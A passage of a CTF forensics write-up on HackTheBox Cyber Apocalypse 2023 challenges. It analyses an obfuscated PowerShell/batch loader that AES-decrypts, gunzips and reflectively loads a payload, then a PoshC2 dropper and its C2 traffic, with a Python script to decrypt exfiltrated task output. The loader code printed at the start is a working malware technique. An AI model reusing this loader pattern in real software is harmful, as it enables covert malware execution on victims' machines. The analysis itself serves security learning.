$BacUA.Key <span class="o">=</span> <span class="o">[</span><span class="kd">System</span>.Convert<span class="o">]</span>::<span class="o">(</span><span class="s1">'gnirtS46esaBmorF'</span><span class="o">[-</span><span class="m">1</span>..<span class="o">-</span><span class="m">16</span><span class="o">]</span> <span class="na">-join </span><span class="s1">''</span><span class="o">)(</span><span class="s1">'0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20='</span><span class="o">)</span>
$BacUA.IV <span class="o">=</span> <span class="o">[</span><span class="kd">System</span>.Convert<span class="o">]</span>::<span class="o">(</span><span class="s1">'gnirtS46esaBmorF'</span><span class="o">[-</span><span class="m">1</span>..<span class="o">-</span><span class="m">16</span><span class="o">]</span> <span class="na">-join </span><span class="s1">''</span><span class="o">)(</span><span class="s1">'2hn/J717js1MwdbbqMn7Lw=='</span><span class="o">)</span>
$Nlgap <span class="o">=</span> $BacUA.CreateDecryptor<span class="o">()</span>
$uZOcm <span class="o">=</span> $Nlgap.TransformFinalBlock<span class="o">(</span>$uZOcm<span class="o">,</span> <span class="m">0</span><span class="o">,</span> $uZOcm.Length<span class="o">)</span>
$Nlgap.Dispose<span class="o">()</span>
$BacUA.Dispose<span class="o">()</span>
$mNKMr <span class="o">=</span> <span class="kd">New</span><span class="na">-Object </span><span class="kd">System</span>.IO.MemoryStream<span class="o">(,</span> $uZOcm<span class="o">)</span>
$bTMLk <span class="o">=</span> <span class="kd">New</span><span class="na">-Object </span><span class="kd">System</span>.IO.MemoryStream
$NVPbn <span class="o">=</span> <span class="kd">New</span><span class="na">-Object </span><span class="kd">System</span>.IO.Compression.GZipStream<span class="o">(</span>$mNKMr<span class="o">,</span> <span class="o">[</span><span class="kd">IO</span>.Compression.CompressionMode<span class="o">]</span>::Decompress<span class="o">)</span>
$NVPbn.CopyTo<span class="o">(</span>$bTMLk<span class="o">)</span>
$NVPbn.Dispose<span class="o">()</span>
$mNKMr.Dispose<span class="o">()</span>
$bTMLk.Dispose<span class="o">()</span>
$uZOcm <span class="o">=</span> $bTMLk.ToArray<span class="o">()</span>
$gDBNO <span class="o">=</span> <span class="o">[</span><span class="kd">System</span>.Reflection.Assembly<span class="o">]</span>::<span class="o">(</span><span class="s1">'daoL'</span><span class="o">[-</span><span class="m">1</span>..<span class="o">-</span><span class="m">4</span><span class="o">]</span> <span class="na">-join </span><span class="s1">''</span><span class="o">)(</span>$uZOcm<span class="o">)</span>
$PtfdQ <span class="o">=</span> $gDBNO.EntryPoint
$PtfdQ.Invoke<span class="o">(</span>$null<span class="o">,</span> <span class="o">(,</span> <span class="o">[</span><span class="kd">string</span><span class="o">[]]</span> <span class="o">(</span><span class="s1">'</span><span class="err">%</span><span class="s1">*'</span><span class="o">)))</span>
</pre></table></code></div></div><p>The script first copies Powershell to the present working directory and renames it to match the script’s name,.</p><div class="language-batch highlighter-rouge"><div class="code-header"> <span data-label-text="Batch"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nb">copy</span> <span class="kd">C</span>:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe <span class="na">/y </span><span class="err">%</span><span class="o">~</span><span class="m">0</span>.exe

<span class="nb">cls</span>
<span class="nb">cd</span> <span class="vm">%~dp0</span>
</pre></table></code></div></div><p>The script then reads its contents for any line that starts with the characters <code class="language-plaintext highlighter-rouge">::</code> which correspond to a comment. In this case, the only line that matches this criteria is the Base64 string.</p><div class="language-batch highlighter-rouge"><div class="code-header"> <span data-label-text="Batch"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kd">foreach</span> <span class="o">(</span>$YiLGW <span class="k">in</span> $eIfqq<span class="o">)</span> <span class="o">{</span> 
	<span class="k">if</span> <span class="o">(</span>$YiLGW.StartsWith<span class="o">(</span><span class="s1">':: '</span><span class="o">))</span> <span class="o">{</span>  
		$VuGcO <span class="o">=</span> $YiLGW.Substring<span class="o">(</span><span class="m">3</span><span class="o">)</span>
 		<span class="nb">break</span>
 	<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>The script then decodes and decrypts the payload using the provided AES key and initialization vector, and writes the memory stream to a gzip archive.</p><p>In order to obtain this file, I used the Base64 decode and AES decrypt functions on CyberChef. The 1F 8B hex bytes at the beginning confirm that this is a gzip archive.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/relic_maps/gz.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/relic_maps/gz.png" alt="" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/relic_maps/signature.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/relic_maps/signature.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Using the gunzip operation, I extracted the contents of the archive, which turned out to be a Windows portable executable binary.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/relic_maps/gunzip.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/relic_maps/gunzip.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Further down in the binary, I noticed a string that appeared to be a flag, but with null bytes in between the characters.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/relic_maps/flag_space.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/relic_maps/flag_space.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Using the remove whitespace operation, I was able to make this string more readable and obtain the flag.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/relic_maps/flag.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/relic_maps/flag.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{0neN0Te?_iT'5_4_tr4P!}</code></p><h2 id="interstellar-c2"><span class="me-2">Interstellar C2</span><a href="#interstellar-c2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Difficulty: Hard - 325 points</p><blockquote><p>We noticed some interesting traffic coming from outer space. An unknown group is using a Command and Control server. After an exhaustive investigation, we discovered they had infected multiple scientists from Pandora’s private research lab. Valuable research is at risk. Can you find out how the server works and retrieve what was stolen?</p></blockquote><p>This challenge gives us another packet capture with TCP and HTTP traffic. Following the TCP streams, the very first stream is a GET request for a powershell script.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/ps1.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/ps1.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Similar to the batch script in the previous challenge, this script is obfuscated and utilizes AES encryption. I attempted to use PowerDecode, which failed, but <a href="https://github.com/R3MRUM/PSDecode">PSDecode</a> was successful.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/deobf.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/deobf.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>This script downloads an external payload and moves it to the temporary directory, decrypts the payload, and runs the resultant executable.</p><p>The third TCP stream shows the capture of the payload being downloaded.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/download.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/download.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>I recovered this payload from the packet capture and decrypted it using CyberChef.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/binary.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/binary.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>I then downloaded the binary and loaded into Ghidra for analysis. There were a few different functions, including Encryption, Decryption, and ImplantCore. I also ran a search for strings, which returned a few interesting results. The most interesting was a file name, <code class="language-plaintext highlighter-rouge">dropper_cs.exe</code>.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/funcs.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/funcs.png" alt="" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/dropper.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/dropper.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>A quick online search revealed that this was most likely a dropper for <a href="https://github.com/nettitude/PoshC2">PoshC2</a>, a popular open-source command and control framework.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/search.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/search.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>I verified this by comparing the strings that Ghidra located to the <a href="https://github.com/infosecn1nja/PoshC2_Python/blob/master/Files/dropper.cs">source code</a> for this dropper.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/strings.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/strings.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>This <a href="https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2021/08/28/posh_c2_-_commandandcontrol-xVbY.html">blog post</a> from Keysight goes into detail about how PoshC2 works, and this was the basis for me solving this challenge.</p><p>For the next stage (stage 1 in the blog post), there is a request with a session ID that is both Base64 encoded and AES encrypted.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/stage1.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/stage1.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Fortunately for us, the binary contains the Base64 encoded AES private key.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/base64.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/base64.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>I wrote a Python script based off the ruby script that the author of the blog post used to decrypt the payload.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/decrypt.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/decrypt.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>In this decrypted payload, I can barely makeout the new AES key that is used to encrypt the future communications, as well as random URIs that are used for beaconing and task execution.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/newkey.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/newkey.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>For task execution, the contents of the GET request are encoded and encrypted as well. The task responses are POST requests that are back to the C2 server in a complex form. The output is first compressed using Gzip, then encrypted with AES, and then is appended to a 1500 byte PNG image before being sent back to the C2 server. So I started looking for POST requests.</p><p>When I looked at the HTTP objects, I noticed one that was much larger than the others. This object corresponded to a request that began at packet 7242. Given its large size, I decided to investigate it first.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/largepost.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/largepost.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>I wrote a script to decrypt and decode the data from the task’s output.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="n">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span>
<span class="kn">import</span> <span class="n">base64</span>
<span class="kn">import</span> <span class="n">gzip</span>

<span class="k">def</span> <span class="nf">get_file</span><span class="p">():</span>
    <span class="n">private_key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="sh">'</span><span class="s">nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">enc</span><span class="o">=</span><span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">data</span><span class="p">)[</span><span class="mi">1500</span><span class="p">:]</span>
    <span class="n">iv</span> <span class="o">=</span> <span class="n">enc</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span>
    <span class="n">enc</span><span class="o">=</span><span class="n">enc</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
    <span class="n">obj</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">private_key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
    <span class="n">dec</span> <span class="o">=</span> <span class="n">obj</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">gzip</span><span class="p">.</span><span class="nf">decompress</span><span class="p">(</span><span class="n">dec</span><span class="p">).</span><span class="nf">decode</span><span class="p">()</span>

<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">pkt7242-hex</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>

<span class="n">g</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">out_file</span> <span class="o">=</span> <span class="nf">get_file</span><span class="p">()</span>
<span class="n">g</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">out_file</span><span class="p">))</span>
</pre></table></code></div></div><p>I took the input from that large post request, converted it to hex, and fed it into the script. I added the second base64 decode statement after I discovered that the output was also base64 encoded.</p><p>The output of the file turned out to be a PNG image file!</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/image.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/image.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Opening the image in ristretto, I see the flag in a sticky note in the top right corner of the screen.</p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/flag.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/flag.png" alt="" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/cropped_flag.png" class="popup img-link "><img data-src="/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/cropped_flag.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{h0w_c4N_y0U_s3e_p05H_c0mM4nd?}</code></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/ctf-writeups/">CTF Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >HackTheBox</a> <a href="/tags/htb-cyber-apocalypse-2023/" class="post-tag no-text-decoration" >HTB-Cyber-Apocalypse-2023</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted me-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox%20Cyber%20Apocalypse%202023%20-%20Forensics%20-%20nitrolabs&url=https%3A%2F%2Fnitrolabs.xyz%2Fposts%2FHTB-CA2023-Forensics%2F" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter" > <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox%20Cyber%20Apocalypse%202023%20-%20Forensics%20-%20nitrolabs&u=https%3A%2F%2Fnitrolabs.xyz%2Fposts%2FHTB-CA2023-Forensics%2F" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook" > <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox%20Cyber%20Apocalypse%202023%20-%20Forensics%20-%20nitrolabs&url=https%3A%2F%2Fnitrolabs.xyz%2Fposts%2FHTB-CA2023-Forensics%2F" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram" > <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/BSides-FW/">BSides Ft. Wayne 2022 Recap and CTF Writeup</a><li class="text-truncate lh-lg"> <a href="/posts/The-Vault/">HTB Uni CTF 2021 Qualifier Writeup: The Vault</a><li class="text-truncate lh-lg"> <a href="/posts/Upgrades/">HTB Uni CTF 2021 Qualifier Writeup: Upgrades</a><li class="text-truncate lh-lg"> <a href="/posts/home-network-setup/">Upgrading My Home Network</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a> <a class="post-tag btn btn-outline-primary" href="/tags/writeup/">writeup</a> <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag btn btn-outline-primary" href="/tags/htb-cyber-apocalypse-2023/">HTB-Cyber-Apocalypse-2023</a> <a class="post-tag btn btn-outline-primary" href="/tags/uni-ctf/">Uni-CTF</a> <a class="post-tag btn btn-outline-primary" href="/tags/bsides-fw-ctf/">BSides-FW-CTF</a> <a class="post-tag btn btn-outline-primary" href="/tags/bsides/">BSides</a> <a class="post-tag btn btn-outline-primary" href="/tags/homelab/">homelab</a> <a class="post-tag btn btn-outline-primary" href="/tags/mikrotik/">MikroTik</a> <a class="post-tag btn btn-outline-primary" href="/tags/networking/">networking</a></div></section></div><section id="toc-wrapper" class="ps-0 pe-4 mb-5"><h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/HTB-CA2023-Reversing-HW-Misc/" class="post-preview card h-100"><div class="card-body"> <time class="small" data-ts="1679619600" data-df="ll" > Mar 23, 2023 </time><h4 class="pt-0 my-2">HackTheBox Cyber Apocalypse 2023 - Reversing/Hardware/Misc</h4><div class="text-muted small"><p> I decided to throw all of these together since they were fairly short writeups. Reversing Shattered Tablet Difficulty: Very Easy - 300 points Deep in an ancient tomb, you’ve discovered a s...</p></div></div></a></article><article class="col"> <a href="/posts/Upgrades/" class="post-preview card h-100"><div class="card-body"> <time class="small" data-ts="1637588940" data-df="ll" > Nov 22, 2021 </time><h4 class="pt-0 my-2">HTB Uni CTF 2021 Qualifier Writeup: Upgrades</h4><div class="text-muted small"><p> Category: Reversing Difficulty: Easy We’re given a macro-enabled Powerpoint presentation with the file name Upgrades.pptm. As expected, when we open this file in LibreOffice Impress, it finds th...</p></div></div></a></article><article class="col"> <a href="/posts/The-Vault/" class="post-preview card h-100"><div class="card-body"> <time class="small" data-ts="1637589120" data-df="ll" > Nov 22, 2021 </time><h4 class="pt-0 my-2">HTB Uni CTF 2021 Qualifier Writeup: The Vault</h4><div class="text-muted small"><p> Category: Reversing Difficulty: Medium We’re given the binary vault. After opening it in Ghidra, we start at the main function and after going through an intermediate function, reach the followin...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/HTB-CA2023-Reversing-HW-Misc/" class="btn btn-outline-primary" aria-label="Older" ><p>HackTheBox Cyber Apocalypse 2023 - Reversing/Hardware/Misc</p></a><div class="btn btn-outline-primary disabled" aria-label="Newer"><p>-</p></div></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p> © <time>2023</time> <a href="https://github.com/nitrowv">Tanner Johnston</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a> <a class="post-tag btn btn-outline-primary" href="/tags/writeup/">writeup</a> <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag btn btn-outline-primary" href="/tags/htb-cyber-apocalypse-2023/">HTB-Cyber-Apocalypse-2023</a> <a class="post-tag btn btn-outline-primary" href="/tags/uni-ctf/">Uni-CTF</a> <a class="post-tag btn btn-outline-primary" href="/tags/bsides-fw-ctf/">BSides-FW-CTF</a> <a class="post-tag btn btn-outline-primary" href="/tags/bsides/">BSides</a> <a class="post-tag btn btn-outline-primary" href="/tags/homelab/">homelab</a> <a class="post-tag btn btn-outline-primary" href="/tags/mikrotik/">MikroTik</a> <a class="post-tag btn btn-outline-primary" href="/tags/networking/">networking</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.9/dayjs.min.js,npm/dayjs@1.11.9/locale/en.min.js,npm/dayjs@1.11.9/plugin/relativeTime.min.js,npm/dayjs@1.11.9/plugin/localizedFormat.min.js,npm/tocbot@4.21.1/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/unregister.js"></script> <script> /* Note: dependent library will be loaded in `js-selector.html` */ SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
